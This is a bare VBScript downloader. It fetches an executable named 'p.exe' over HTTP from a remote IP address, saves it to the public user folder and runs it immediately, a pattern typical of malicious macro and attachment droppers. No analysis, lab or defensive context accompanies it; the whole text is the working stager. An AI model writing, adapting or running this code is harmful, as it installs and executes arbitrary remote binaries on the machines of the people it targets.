Set x = CreateObject("MSXML2.XMLHTTP")
x.Open "GET", "http://198.51.100.7/p.exe", False
x.Send
Set s = CreateObject("ADODB.Stream")
s.Type = 1: s.Open: s.Write x.responseBody
s.SaveToFile "C:\Users\Public\p.exe", 2
CreateObject("WScript.Shell").Run "C:\Users\Public\p.exe"
